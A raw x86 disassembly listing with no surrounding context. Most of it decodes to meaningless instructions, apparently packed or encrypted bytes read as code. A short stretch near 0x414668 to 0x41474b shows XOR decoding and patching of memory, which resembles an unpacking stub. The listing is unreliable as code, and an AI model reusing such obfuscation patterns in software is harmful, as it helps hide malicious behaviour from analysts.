  4142d3:	push   0x189e91aa
  4142d8:	repz jl 0x41431d
  4142db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4142dc:	ins    BYTE PTR es:[edi],dx
  4142dd:	arpl   WORD PTR [ecx+0x2d67e849],ax
  4142e3:	mov    eax,ds:0x28a19b3a
  4142e8:	cwde   
  4142e9:	imul   esi,DWORD PTR [esp+edi*4-0x29],0x24156508
  4142f1:	xchg   esp,eax
  4142f2:	loope  0x414300
  4142f4:	and    edx,DWORD PTR [esi+0x2]
  4142f7:	adc    BYTE PTR ds:0x603c641d,0xc1
  4142fe:	lods   eax,DWORD PTR ds:[esi]
  4142ff:	inc    esp
  414300:	idiv   DWORD PTR [edx+edx*2+0x6f]
  414304:	js     0x41433c
  414306:	xchg   DWORD PTR [ebx+0x2193e1ed],eax
  41430c:	in     eax,dx
  41430d:	leave  
  41430e:	push   0xb27dd78
  414313:	iret   
  414314:	pop    eax
  414315:	shl    BYTE PTR [edi+0x703d897e],1
  41431b:	jbe    0x414378
  41431d:	shr    BYTE PTR [ebp+0xcc991f4],0x11
  414324:	xchg   edi,eax
  414325:	add    esi,edi
  414327:	rcl    BYTE PTR [edi+0x68166930],1
  41432d:	or     esi,DWORD PTR [ebx-0x472b0679]
  414333:	aas    
  414334:	or     DWORD PTR [esi-0x4d4a235e],0xa
  41433b:	pusha  
  41433c:	jne    0x4143bc
  41433e:	jnp    0x414306
  414340:	ret    0xe234
  414343:	or     DWORD PTR [eax+ebp*8],ebp
  414346:	mov    ch,0x89
  414348:	or     eax,0x9113acbe
  41434d:	rcl    BYTE PTR [edi+0x39],cl
  414350:	sbb    edx,DWORD PTR [edi-0x32e24df3]
  414356:	pop    ebx
  414357:	(bad)  
  414358:	jl     0x4143d4
  41435a:	xchg   ebp,eax
  41435b:	in     al,dx
  41435c:	jb     0x414383
  41435e:	inc    esp
  41435f:	dec    esi
  414360:	or     dl,dl
  414362:	dec    esi
  414363:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414364:	dec    ecx
  414365:	jo     0x414341
  414367:	loope  0x4143b8
  414369:	lds    esi,FWORD PTR ds:0xc60b898f
  41436f:	call   0x48d5:0xefca958e
  414376:	push   es
  414377:	jmp    0x5f1ae206
  41437c:	sti    
  41437d:	(bad)  
  41437e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41437f:	scas   eax,DWORD PTR es:[edi]
  414380:	mov    al,0x1e
  414382:	xlat   BYTE PTR ds:[ebx]
  414383:	pop    esp
  414384:	or     al,0xf6
  414386:	pusha  
  414387:	dec    esi
  414388:	loop   0x41436b
  41438a:	xchg   edx,eax
  41438b:	cmc    
  41438c:	xchg   ebp,eax
  41438d:	test   ebp,0xae7340d0
  414393:	ds ja  0x414337
  414396:	mov    esi,0xf1660917
  41439b:	je     0x414348
  41439d:	push   cs
  41439e:	inc    ebp
  41439f:	je     0x38ccfb82
  4143a5:	cld    
  4143a6:	and    DWORD PTR ss:[esi],0x8
  4143aa:	test   DWORD PTR gs:[edx-0x67c8164d],ebx
  4143b1:	fwait
  4143b2:	xor    al,0xde
  4143b4:	ret    
  4143b5:	nop
  4143b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4143b7:	pop    ebp
  4143b8:	dec    esp
  4143b9:	test   edi,esi
  4143bb:	pusha  
  4143bc:	bnd jnp 0x41433f
  4143bf:	xchg   ecx,eax
  4143c0:	add    eax,0x44eaaf26
  4143c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4143c6:	jge    0x41439b
  4143c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4143c9:	pop    esi
  4143ca:	pushf  
  4143cb:	sbb    esp,DWORD PTR [ecx+0x2aee6d8e]
  4143d1:	cmp    bh,ch
  4143d3:	scas   al,BYTE PTR es:[edi]
  4143d4:	jge    0x41443f
  4143d6:	mov    ah,0xa
  4143d8:	out    dx,eax
  4143d9:	call   0xa5d:0xa572e4a4
  4143e0:	stos   DWORD PTR es:[edi],eax
  4143e1:	mov    ds:0xcfa2903f,eax
  4143e6:	or     esi,esp
  4143e8:	(bad)  
  4143ea:	push   ds
  4143eb:	mov    ebp,0x5aa484e5
  4143f0:	cwde   
  4143f1:	lock push eax
  4143f3:	xchg   ebx,eax
  4143f4:	inc    esi
  4143f5:	aad    0xbb
  4143f7:	mov    al,ds:0xd89d9ec2
  4143fc:	cmp    al,0x4b
  4143fe:	pop    esi
  4143ff:	pop    es
  414400:	les    edx,FWORD PTR [ebx+0xb]
  414403:	adc    BYTE PTR [eax],0xe4
  414406:	je     0x41441c
  414408:	mov    ds:0xb1ea963e,al
  41440d:	(bad)  
  41440e:	push   ss
  41440f:	ins    DWORD PTR es:[edi],dx
  414410:	arpl   WORD PTR [edi],bx
  414412:	clc    
  414413:	mov    dl,0x99
  414415:	jge    0x4143f7
  414417:	(bad)  
  414419:	and    al,0x68
  41441b:	ffreep st(2)
  41441d:	clc    
  41441e:	shl    esi,cl
  414420:	jge    0x4143d8
  414422:	xor    ah,BYTE PTR [ebp-0x4f89432f]
  414428:	push   es
  414429:	xchg   esp,eax
  41442a:	cmp    cl,BYTE PTR [ebp-0xd]
  41442d:	mov    eax,ds:0xd5d87de1
  414432:	adc    ch,bh
  414434:	xor    DWORD PTR [ecx+0x6c],edx
  414437:	call   0xf87e:0x7b727607
  41443e:	les    esi,FWORD PTR [edi+0x62]
  414441:	mov    BYTE PTR [edx+0x2c],bl
  414444:	(bad)  
  414445:	out    dx,al
  414446:	jno    0x4143cd
  414448:	xor    BYTE PTR [eax+edx*4],bh
  41444b:	add    al,0x34
  41444d:	xlat   BYTE PTR ds:[ebx]
  41444e:	(bad)  
  41444f:	aas    
  414450:	je     0x414488
  414452:	push   ds
  414453:	and    edi,edx
  414455:	ins    BYTE PTR es:[edi],dx
  414456:	push   ds
  414457:	std    
  414458:	adc    DWORD PTR [esi-0x13],0xa0df3cbb
  41445f:	xchg   esp,eax
  414460:	cmp    al,0x3a
  414462:	aad    0x15
  414464:	xor    eax,0xa3bc73a3
  414469:	stc    
  41446a:	mov    bl,0x89
  41446c:	retf   
  41446d:	lds    edi,FWORD PTR [esi-0x5b]
  414470:	mov    bh,0x15
  414472:	adc    ch,BYTE PTR [esi]
  414474:	fsubr  st,st(2)
  414476:	pop    esp
  414477:	push   edx
  414478:	pop    esi
  414479:	repz clc 
  41447b:	mov    ebx,0x8bcc3835
  414480:	add    ch,0x87
  414483:	xchg   ecx,eax
  414484:	clc    
  414485:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414486:	cmc    
  414487:	pop    ds
  414488:	push   edi
  414489:	aad    0xde
  41448b:	inc    eax
  41448c:	ret    
  41448d:	fsubr  DWORD PTR [ebx-0xafb3b1]
  414493:	adc    edi,DWORD PTR [eax-0x2a0cb618]
  414499:	pushf  
  41449a:	dec    ecx
  41449b:	add    al,0x3a
  41449d:	add    eax,0x580cf47f
  4144a2:	ja     0x414425
  4144a4:	loopne 0x4144d7
  4144a6:	xchg   ebx,eax
  4144a7:	push   ebp
  4144a8:	or     DWORD PTR [edi+0x42],ebp
  4144ab:	sbb    BYTE PTR [edx+0x18999c0c],0x2a
  4144b2:	pop    eax
  4144b3:	ins    DWORD PTR es:[edi],dx
  4144b4:	cmp    ah,BYTE PTR [ecx]
  4144b6:	cmc    
  4144b7:	push   es
  4144b8:	std    
  4144b9:	rcr    DWORD PTR ds:0xe403,0xfa
  4144bf:	(bad)  
  4144c0:	int3   
  4144c1:	xlat   BYTE PTR ds:[ebx]
  4144c2:	sub    ch,BYTE PTR [ebp-0x76589933]
  4144c8:	mov    DWORD PTR [edi],esp
  4144ca:	ss xchg edi,eax
  4144cc:	test   eax,0x35c32924
  4144d1:	mov    ds:0x3d39868c,al
  4144d6:	pushf  
  4144d7:	icebp  
  4144d8:	hlt    
  4144d9:	and    eax,0x14a3f5e3
  4144de:	adc    bl,0xdf
  4144e1:	xchg   ebx,eax
  4144e2:	(bad)  
  4144e3:	scas   eax,DWORD PTR es:[edi]
  4144e4:	mov    ah,0x52
  4144e6:	xchg   ecx,eax
  4144e7:	or     edi,eax
  4144e9:	sub    cl,BYTE PTR [edx]
  4144eb:	xchg   DWORD PTR [edi+0x16],esi
  4144ee:	retf   
  4144ef:	fwait
  4144f0:	enter  0x5b16,0x65
  4144f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4144f5:	popa   
  4144f6:	push   ss
  4144f7:	push   0xfcc877fd
  4144fc:	sbb    BYTE PTR [edi+eiz*2+0x22],bh
  414500:	icebp  
  414501:	daa    
  414502:	sbb    DWORD PTR ds:0x54f7dc76,esi
  414508:	adc    bh,BYTE PTR [eax+0x22]
  41450b:	int    0xc3
  41450d:	out    dx,eax
  41450e:	jmp    0x5fdd0266
  414513:	(bad)
  414516:	(bad)  
  414517:	cdq    
  414518:	enter  0xe9a5,0xbe
  41451c:	cmp    eax,0x75e84cc0
  414521:	or     eax,0xc3a07698
  414526:	adc    dh,ah
  414528:	lea    eax,[ecx-0x59]
  41452b:	or     al,BYTE PTR [edx+0x73]
  41452e:	shl    BYTE PTR ds:0x6c99888e,cl
  414534:	fisubr DWORD PTR [edi]
  414536:	sub    ecx,ecx
  414538:	aaa    
  414539:	and    BYTE PTR [ecx+0x2f1dba38],ah
  41453f:	push   cs
  414540:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414541:	mov    ecx,0xe44aec76
  414546:	adc    ch,BYTE PTR [ebx]
  414548:	adc    DWORD PTR [ebp+0x3a],esp
  41454b:	daa    
  41454c:	cdq    
  41454d:	hlt    
  41454e:	outs   dx,DWORD PTR ds:[esi]
  41454f:	xlat   BYTE PTR ds:[ebx]
  414550:	fsubrp st(4),st
  414552:	repnz outs dx,DWORD PTR ds:[esi]
  414554:	call   0x9e39564b
  414559:	add    BYTE PTR [eax-0x69],cl
  41455c:	aas    
  41455d:	jg     0x41452b
  41455f:	icebp  
  414560:	popa   
  414561:	test   DWORD PTR [ebx],eax
  414563:	icebp  
  414564:	(bad)  
  414565:	cmp    esi,DWORD PTR [edi+0x12]
  414568:	div    esi
  41456a:	pop    edi
  41456b:	inc    eax
  41456c:	push   ebp
  41456d:	mov    cl,0xa3
  41456f:	xchg   ebx,eax
  414570:	in     al,dx
  414571:	mul    DWORD PTR [edx+0x6a]
  414574:	stc    
  414575:	loop   0x414543
  414577:	mov    bl,0xb6
  414579:	jae    0x414585
  41457b:	mov    dl,0x96
  41457d:	popf   
  41457e:	(bad)  
  41457f:	adc    dh,BYTE PTR [ebp-0x5c03d9e3]
  414585:	inc    esi
  414586:	mov    ebx,0x9881a8dd
  41458b:	dec    esi
  41458c:	inc    ebp
  41458d:	ins    DWORD PTR es:[edi],dx
  41458e:	mov    al,ds:0x73e7d2f1
  414593:	rcl    dl,1
  414595:	scas   al,BYTE PTR es:[edi]
  414596:	add    ch,dh
  414598:	mov    al,BYTE PTR [esi-0x36fab2b6]
  41459e:	xor    BYTE PTR [edx+0x532279ff],0x8f
  4145a5:	or     BYTE PTR [ebx],bh
  4145a7:	xchg   dh,dl
  4145a9:	ins    BYTE PTR es:[edi],dx
  4145aa:	push   eax
  4145ab:	sbb    bh,BYTE PTR [eax-0x6c]
  4145ae:	push   eax
  4145af:	mov    WORD PTR [edi+ecx*8+0x12],ds
  4145b3:	push   ebx
  4145b4:	dec    ecx
  4145b5:	push   0xdb18d70e
  4145ba:	mov    ebp,0x4077d71d
  4145bf:	aad    0x59
  4145c1:	fisttp QWORD PTR ds:0xacdc19fc
  4145c7:	sub    ecx,DWORD PTR [eax-0x7a3071d0]
  4145cd:	dec    eax
  4145ce:	cmp    eax,0x34340ffe
  4145d3:	or     esi,ebp
  4145d5:	and    bh,BYTE PTR ss:[ebx+0x373438bb]
  4145dc:	fst    QWORD PTR [edi]
  4145df:	push   esi
  4145e0:	inc    ebx
  4145e1:	dec    esi
  4145e2:	push   0x60871424
  4145e7:	push   esi
  4145e8:	test   DWORD PTR [esi],esi
  4145ea:	jl     0x414570
  4145ec:	mov    ds:0xc44e6b0,eax
  4145f1:	jmp    0xa231:0x74b30373
  4145f8:	adc    BYTE PTR [esp+esi*2],ah
  4145fb:	push   cs
  4145fc:	push   ebp
  4145fd:	push   edi
  4145fe:	inc    ebx
  4145ff:	iret   
  414600:	pop    ecx
  414601:	inc    ebp
  414602:	and    DWORD PTR [ecx],0xb81f6dfa
  414608:	loope  0x41459e
  41460a:	(bad)  
  41460b:	adc    al,0x7c
  41460d:	sbb    al,0x6d
  41460f:	cld    
  414610:	mov    ebp,0x4db89359
  414615:	out    dx,eax
  414616:	das    
  414617:	jno    0x41466a
  414619:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41461a:	jg     0x414669
  41461c:	sbb    BYTE PTR [edx],bl
  41461e:	std    
  41461f:	in     eax,dx
  414620:	push   ss
  414621:	ds sbb eax,0xff516a71
  414627:	jp     0x414615
  414629:	pop    ds
  41462a:	dec    ecx
  41462b:	pop    edi
  41462c:	fs popf 
  41462e:	sub    BYTE PTR [ebx+0x2d],bl
  414631:	xchg   BYTE PTR [edi-0x21],bh
  414634:	clc    
  414635:	mov    ecx,DWORD PTR [edi-0x53]
  414638:	aaa    
  414639:	xchg   edx,eax
  41463a:	jp     0x4146a6
  41463c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41463d:	xor    esi,DWORD PTR [edx+eiz*2+0xd]
  414641:	fbstp  TBYTE PTR [ebp+0x44]
  414644:	sar    DWORD PTR [eax+0x7a],0x3
  414648:	and    cl,BYTE PTR [ecx+0x1379ca7b]
  41464e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41464f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414650:	aas    
  414651:	lods   al,BYTE PTR ds:[esi]
  414652:	dec    esi
  414653:	inc    ebx
  414654:	idiv   DWORD PTR [ecx+0x6f]
  414657:	repnz push esi
  414659:	push   edx
  41465a:	jns    0x414688
  41465c:	ins    DWORD PTR es:[edi],dx
  41465d:	and    edx,edx
  41465f:	scas   al,BYTE PTR es:[edi]
  414660:	(bad)  
  414661:	push   esi
  414662:	pcmpgtw mm2,QWORD PTR [edx+0xb]
  414666:	test   al,0xd3
  414668:	mov    eax,0x127077da
  41466d:	xor    eax,esi
  41466f:	add    eax,edi
  414671:	push   eax
  414672:	mov    eax,DWORD PTR [ebp-0x1c]
  414675:	xor    eax,esi
  414677:	add    eax,edi
  414679:	push   eax
  41467a:	mov    eax,DWORD PTR [ebp-0x10]
  41467d:	xor    eax,esi
  41467f:	add    eax,edi
  414681:	push   eax
  414682:	lea    eax,[ebp-0x90]
  414688:	push   eax
  414689:	push   DWORD PTR [ebp-0x20]
  41468c:	push   DWORD PTR [ebp-0x30]
  41468f:	call   0x40f89f
  414694:	test   eax,eax
  414696:	je     0x4146c7
  41469c:	lea    eax,[ebp-0x90]
  4146a2:	push   eax
  4146a3:	mov    eax,DWORD PTR [ebp-0x30]
  4146a6:	xor    eax,esi
  4146a8:	add    eax,edi
  4146aa:	push   eax
  4146ab:	mov    eax,DWORD PTR [ebp-0x2c]
  4146ae:	add    eax,0xaa
  4146b3:	push   eax
  4146b4:	mov    eax,DWORD PTR [ebp-0x2c]
  4146b7:	mov    eax,DWORD PTR [eax+0x198]
  4146bd:	push   DWORD PTR [eax]
  4146bf:	call   0x40867e
  4146c4:	mov    DWORD PTR [ebp-0x40],eax
  4146c7:	lea    eax,[ebp+0x4]
  4146ca:	mov    DWORD PTR [ebp-0x34],eax
  4146cd:	mov    eax,DWORD PTR [ebp-0x8]
  4146d0:	mov    eax,DWORD PTR [eax]
  4146d2:	mov    eax,DWORD PTR [eax]
  4146d4:	mov    eax,DWORD PTR [eax]
  4146d6:	test   eax,eax
  4146d8:	je     0x416aa8
  4146de:	lea    eax,[ebp-0xc]
  4146e1:	mov    DWORD PTR [ebp-0x4c],eax
  4146e4:	mov    eax,DWORD PTR [ebp-0x3c]
  4146e7:	mov    DWORD PTR [ebp-0xc],eax
  4146ea:	mov    eax,DWORD PTR [ebp-0x8]
  4146ed:	mov    eax,DWORD PTR [eax]
  4146ef:	mov    eax,DWORD PTR [eax]
  4146f1:	mov    eax,DWORD PTR [eax]
  4146f3:	sub    DWORD PTR [ebp-0xc],eax
  4146f6:	mov    ecx,DWORD PTR [ebp-0x10]
  4146f9:	xor    ecx,esi
  4146fb:	mov    eax,0xffcd8d25
  414700:	sub    eax,ecx
  414702:	add    DWORD PTR [ebp-0xc],eax
  414705:	mov    eax,DWORD PTR [ebp-0xc]
  414708:	mov    ecx,DWORD PTR [ebp-0x8]
  41470b:	mov    ecx,DWORD PTR [ecx]
  41470d:	mov    ecx,DWORD PTR [ecx]
  41470f:	mov    ecx,DWORD PTR [ecx]
  414711:	mov    DWORD PTR [ecx+0x1],eax
  414714:	mov    al,BYTE PTR [ebp-0x1]
  414717:	mov    ecx,DWORD PTR [ebp-0x8]
  41471a:	mov    ecx,DWORD PTR [ecx]
  41471c:	mov    ecx,DWORD PTR [ecx]
  41471e:	mov    ecx,DWORD PTR [ecx]
  414720:	push   DWORD PTR [ebp-0x2c]
  414723:	xor    al,0x6f
  414725:	sub    al,0xd
  414727:	mov    BYTE PTR [ecx],al
  414729:	mov    eax,ds:0x423e86
  41472e:	push   DWORD PTR [eax]
  414730:	push   DWORD PTR ds:0x4240e2
  414736:	push   DWORD PTR ds:0x423e8e
  41473c:	push   DWORD PTR ds:0x4240c2
  414742:	push   DWORD PTR ds:0x42414a
  414748:	push   DWORD PTR [ebp-0x30]
  41474b:	jmp    0x416a9a
  414750:	jp     0x414751
  414752:	int    0x35
  414754:	ret    
  414755:	add    ecx,DWORD PTR [edx-0x41938645]
  41475b:	pop    ss
  41475c:	mov    BYTE PTR [edi-0x7f],ah
  41475f:	daa    
  414760:	mov    WORD PTR [eax+0x61],cs
  414763:	bound  edx,QWORD PTR [eax+0x5f]
  414766:	bound  esp,QWORD PTR [edx+0x3a]
  414769:	sbb    BYTE PTR [edi+0x426554ca],bh
  41476f:	inc    edx
  414770:	push   ecx
  414771:	enter  0xa3c,0x68
  414775:	test   eax,0x4af57fad
  41477a:	jb     0x414770
  41477c:	adc    edi,DWORD PTR [edx+ebx*1+0x9]
  414780:	add    BYTE PTR [eax],dh
  414782:	xor    al,0xf2
  414784:	add    al,0xe7
  414786:	imul   ebp,DWORD PTR [edx-0x16e8bec7],0x4f
  41478d:	retf   
  41478e:	fiadd  DWORD PTR [ebx+0x2decfb81]
  414794:	push   edx
  414795:	sbb    bl,BYTE PTR [edi]
  414797:	pop    ebp
  414798:	sub    ebp,ebp
  41479a:	test   DWORD PTR ds:[ecx],edi
  41479d:	jmp    0x11396644
  4147a2:	xchg   ebx,eax
  4147a3:	sbb    DWORD PTR [ecx-0x4b03cead],esp
  4147a9:	mov    ah,0xb5
  4147ab:	jp     0x4147ad
  4147ad:	xor    al,BYTE PTR [eax-0x58]
  4147b0:	xchg   ebx,eax
  4147b1:	or     eax,0x97f2bcbe
  4147b6:	cmp    DWORD PTR [edi],ebp
  4147b8:	xor    eax,0x3d7d890c
  4147bd:	mov    ?,ebx
  4147bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4147c0:	mov    dh,0xe4
  4147c2:	mov    fs,WORD PTR [edx+0x467e8eed]
  4147c8:	inc    edx
  4147c9:	pop    edx
  4147ca:	adc    BYTE PTR [ebp-0x35],ch
  4147cd:	int    0x95
  4147cf:	mov    ds:0xa3a64706,eax
  4147d4:	in     eax,0x4f
  4147d6:	adc    cl,dl
  4147d8:	lahf   
  4147d9:	sbb    al,BYTE PTR [esi]
  4147db:	push   ebp
  4147dc:	add    DWORD PTR [esi-0x5bb77f47],edx
  4147e2:	fwait
  4147e3:	inc    edi
  4147e4:	jp     0x4147d1
  4147e6:	inc    esi
  4147e7:	inc    ebp
  4147e8:	mov    esp,ebx
  4147ea:	je     0xeb626cda
  4147f0:	mov    dh,0xfe
  4147f2:	pop    edx
  4147f3:	jmp    0x4d76:0x357d8229
  4147fa:	xchg   edx,eax
  4147fb:	xor    esi,DWORD PTR [ecx-0x69]
  4147fe:	scas   eax,DWORD PTR es:[edi]
  4147ff:	pop    ss
  414800:	xchg   bl,al
  414802:	adc    eax,0x1e9e0d2
  414807:	mov    esp,0xf4253491
  41480c:	sub    bl,BYTE PTR ds:0x64cfc1cb
  414812:	and    esp,DWORD PTR [esi]
  414814:	jno    0x4147fd
  414816:	add    edx,ebx
  414818:	push   eax
  414819:	int    0xe9
  41481b:	add    dl,BYTE PTR [ecx-0x32]
  41481e:	sbb    BYTE PTR [ebp-0x4c],dh
  414821:	out    0x39,al
  414823:	mov    bh,0xef
  414825:	dec    edi
  414826:	pop    ds
  414827:	mov    esp,0xddc6dd45
  41482c:	mov    ebp,0x6653ea77
  414831:	mov    esp,0x131b9c3f
  414836:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414837:	mov    BYTE PTR [edi+edx*8-0x5a],ah
  41483b:	int3   
  41483c:	sub    al,0xeb
  41483e:	xchg   BYTE PTR [ecx+0x3b65a87],cl
  414844:	xor    esp,esi
  414846:	into   
  414847:	or     al,BYTE PTR [eax-0x2d0d9cbb]
  41484d:	shl    DWORD PTR [edi],cl
  41484f:	or     al,0xb7
  414851:	inc    ebx
  414852:	gs jns 0x414871
  414855:	shl    BYTE PTR [ebp+0x7f5af948],cl
  41485b:	mov    esp,0xedf54efc
  414860:	stos   DWORD PTR es:[edi],eax
  414861:	sub    edx,eax
  414863:	sbb    BYTE PTR [ebp+0x9],ch
  414866:	cmp    dh,bl
  414868:	imul   edx,DWORD PTR [edi-0x19af9635],0xffffffb4
  41486f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414870:	addr16 mov ds:0x3a54,eax
  414874:	inc    edi
  414875:	xor    ebx,ebp
  414877:	test   BYTE PTR [ebx+ebx*2-0x59],0x87
  41487c:	inc    ecx
  41487d:	add    cl,BYTE PTR [eax]
  41487f:	xlat   BYTE PTR ds:[ebx]
  414880:	inc    eax
  414881:	das    
  414882:	test   BYTE PTR [esi+0x248ea9e],bl
  414888:	inc    edi
  414889:	pop    esp
  41488a:	xor    al,0x2c
  41488c:	fwait
  41488d:	cli    
  41488e:	clc    
  41488f:	dec    ebx
  414890:	stos   DWORD PTR es:[edi],eax
  414891:	jmp    0xdcf5:0x6248113c
  414898:	sbb    edx,DWORD PTR [ebx]
  41489a:	outs   dx,DWORD PTR ds:[esi]
  41489b:	je     0x4148c8
  41489d:	mov    cl,0xa5
  41489f:	iret   
  4148a0:	ss inc ebp
  4148a2:	jno    0x414841
  4148a4:	enter  0xa0af,0xe7
  4148a8:	call   0x3daed95d
  4148ad:	push   ebx
  4148ae:	sbb    DWORD PTR [ebx],ebp
  4148b0:	pop    edi
  4148b1:	xor    DWORD PTR [ebp-0x67],eax
  4148b4:	out    dx,al
  4148b5:	xchg   ecx,eax
  4148b6:	mov    ah,BYTE PTR [eax]
  4148b8:	fdiv   DWORD PTR [ebx+esi*2-0x35ddec8c]
  4148bf:	and    BYTE PTR [ebx+0x3bb9d307],dl
  4148c5:	mov    eax,ds:0x5d44e538
  4148ca:	jae    0x414912
  4148cc:	sar    esp,cl
  4148ce:	cmc    
  4148cf:	and    DWORD PTR fs:[edx+0x74],esp
  4148d3:	xchg   DWORD PTR [ecx],edx
  4148d5:	sbb    esi,0x17
  4148d8:	fcmovnu st,st(7)
  4148da:	mov    esp,0xbb52a8a8
  4148df:	fcom   QWORD PTR [ebx+0x54]
  4148e2:	mov    edx,0xe4b28418
  4148e7:	mov    ds:0x4227acd9,eax
  4148ec:	adc    BYTE PTR [edi-0x1f177f5c],bl
  4148f2:	lods   al,BYTE PTR ds:[esi]
  4148f3:	xchg   esi,eax
  4148f4:	in     al,dx
  4148f5:	and    dl,dl
  4148f7:	cwde   
  4148f8:	(bad)  
  4148f9:	out    0xe8,al
  4148fb:	xchg   esp,eax
  4148fc:	and    edi,edi
  4148fe:	pop    edx
  4148ff:	imul   ebp,DWORD PTR [esi-0x13],0x61a4468e
  414906:	mov    ah,0x9
  414908:	fdivr  QWORD PTR [eax+edi*4]
  41490b:	inc    edi
  41490c:	push   esp
  41490d:	pop    ecx
  41490e:	cmp    DWORD PTR [eax],ebp
  414910:	ror    BYTE PTR [edx-0x3e132c5b],0xf2
  414917:	push   edi
  414918:	iret   
  414919:	ja     0x41491f
  41491b:	dec    esi
  41491c:	sbb    DWORD PTR [eax],ebp
  41491e:	mov    edi,0x60a40eb7
  414923:	cld    
  414924:	pop    esp
  414925:	fcomp  DWORD PTR [edx+esi*2+0x65]
  414929:	add    DWORD PTR [ebp+0x675836b1],edx
  41492f:	or     ecx,esp
  414931:	test   DWORD PTR [eax+0x7d],ecx
  414934:	add    al,0x20
  414936:	data16 or ch,BYTE PTR [ecx+0x8]
  41493a:	xor    eax,0x82253695
  41493f:	cmp    al,0x2d
  414941:	pop    eax
  414942:	pop    ebx
  414943:	(bad)  
  414944:	jp     0x41496e
  414946:	adc    al,0x44
  414948:	mov    bh,0xdf
  41494a:	jnp    0x414978
  41494c:	add    BYTE PTR [ecx+ecx*4],ah
  41494f:	sbb    edx,edx
  414951:	enter  0xe340,0x33
  414955:	xchg   ebx,esp
  414957:	jno    0x4149cc
  414959:	fisubr DWORD PTR [ebx+0x1e]
  41495c:	std    
  41495d:	mov    bh,0xf8
  41495f:	and    esp,DWORD PTR [edi-0x533c9aef]
  414965:	gs es adc eax,0xc8471e9f
  41496c:	sbb    BYTE PTR [ecx+eiz*8+0x1c341bf0],bh
  414973:	icebp  
  414974:	imul   eax,edx,0xffffffaf
  414977:	mov    gs,WORD PTR [ebx-0x4d6b5ac6]
  41497d:	jecxz  0x4149d7
  41497f:	je     0x4149ac
  414981:	retf   0xf97b
  414984:	imul   edx,DWORD PTR [ecx+esi*8+0x3fa78c6f],0x6133632a
  41498f:	xchg   bh,dl
  414991:	sub    ch,BYTE PTR [eax+0x1136335e]
  414997:	clc    
  414998:	repz out dx,al
  41499a:	cmp    DWORD PTR [ebx-0x15],ebp
  41499d:	adc    eax,0x876beb60
  4149a2:	sub    BYTE PTR [ecx+0x54],0x74
  4149a6:	inc    ecx
  4149a7:	outs   dx,BYTE PTR ds:[esi]
  4149a8:	adc    cl,dl
  4149aa:	aam    0x5e
  4149ac:	in     eax,0xde
  4149ae:	push   0xaef62869
  4149b3:	fmul   QWORD PTR [esi-0xe8cfd1e]
  4149b9:	jne    0x41497d
  4149bb:	adc    DWORD PTR [ecx+0x7c4b94c8],ebx
  4149c1:	or     al,0x26
  4149c3:	mov    eax,ds:0x93d1d3
  4149c8:	(bad)  
  4149c9:	pop    ds
  4149ca:	je     0x414971
  4149cc:	ins    DWORD PTR es:[edi],dx
  4149cd:	pop    ecx
  4149ce:	mov    dh,0xef
  4149d0:	add    eax,0x78d0348f
  4149d5:	adc    al,0x68
  4149d7:	daa    
  4149d8:	icebp  
  4149d9:	and    eax,0x27d7bcbf
  4149de:	pop    ebp
  4149df:	push   0x2c3f6437
  4149e4:	dec    ecx
  4149e5:	mov    ?,WORD PTR [edx-0x1f]
  4149e8:	jmp    0xf381:0x43c32a51
  4149ef:	cli    
  4149f0:	cmp    ch,BYTE PTR [esi-0x23]
  4149f3:	loope  0x414a0d
  4149f5:	push   esi
  4149f6:	stc    
  4149f7:	xchg   edi,eax
  4149f8:	mov    edi,0xe34be45
  4149fd:	mov    ebx,0xfb216771
  414a02:	loope  0x414a07
  414a04:	call   FWORD PTR [eax+esi*8]
  414a07:	mov    esi,0x4af61fa4
  414a0c:	cmp    dh,ah
  414a0e:	imul   esp,edx,0x39
  414a11:	push   0x29888d44
  414a16:	cmp    dh,cl
  414a18:	ds jecxz 0x4149d1
  414a1b:	cmp    BYTE PTR [edx],cl
  414a1d:	leave  
  414a1e:	out    0x3a,eax
  414a20:	jns    0x414a06
  414a22:	ss xchg edx,eax
  414a24:	dec    edi
  414a25:	sbb    DWORD PTR [edx-0x2e],ebp
  414a28:	stc    
  414a29:	shl    DWORD PTR [edx+ebx*8-0x436db01f],1
  414a30:	js     0x414a94
  414a32:	xor    esp,edx
  414a34:	dec    ecx
  414a35:	aaa    
  414a36:	cmp    edx,esi
  414a38:	icebp  
  414a39:	cmp    DWORD PTR [edi-0x7a1cd4f4],0xffffff93
  414a40:	imul   ecx,DWORD PTR [ebp+ecx*2+0x69],0x1f
  414a45:	pop    esi
  414a46:	lods   al,BYTE PTR ds:[esi]
  414a47:	dec    esi
  414a48:	ret    0x8549
  414a4b:	cmp    BYTE PTR [edx],dl
  414a4d:	ret    0x5265
  414a50:	fild   DWORD PTR [esi]
  414a52:	ins    DWORD PTR es:[edi],dx
  414a53:	jg     0x414aa9
  414a55:	popa   
  414a56:	xchg   esi,eax
  414a57:	dec    edi
  414a58:	pop    esi
  414a59:	xor    al,0x23
  414a5b:	or     bh,ch
  414a5d:	ins    BYTE PTR es:[edi],dx
  414a5e:	mov    bh,0x18
  414a60:	ficom  DWORD PTR [ecx-0x3f5ed789]
  414a66:	mov    eax,ds:0x40601e5c
  414a6b:	mov    cl,0xf3
  414a6d:	dec    eax
  414a6e:	fisttp QWORD PTR [esi]
  414a70:	call   0x19bb:0xcc078b91
  414a77:	and    dl,ah
  414a79:	or     BYTE PTR [esi],0x3a
  414a7c:	shr    BYTE PTR [edi+0x58],1
  414a7f:	adc    DWORD PTR [edx-0x80],eax
  414a82:	div    ecx
  414a84:	bound  edx,QWORD PTR [ecx-0xb1c54c8]
  414a8a:	xor    BYTE PTR ds:0x334aec7b,al
  414a90:	lock pop ebx
